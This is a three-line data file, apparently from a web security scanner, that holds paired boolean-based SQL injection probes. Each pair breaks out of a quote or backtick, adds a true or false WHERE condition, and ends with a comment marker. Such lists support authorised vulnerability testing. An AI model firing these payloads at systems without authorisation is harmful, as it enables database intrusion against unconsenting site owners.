+{random:str1}' WHERE {random:int1}={random:int1}-- -§§§§{random:str1}' WHERE {random:int1}={random:int2}-- -
+{random:str1}` WHERE {random:int1}={random:int1}#§§§§{random:str1}` WHERE {random:int1}={random:int2}#
+{random:str1}` WHERE {random:int1}={random:int1}-- -§§§§{random:str1}` WHERE {random:int1}={random:int2}-- -
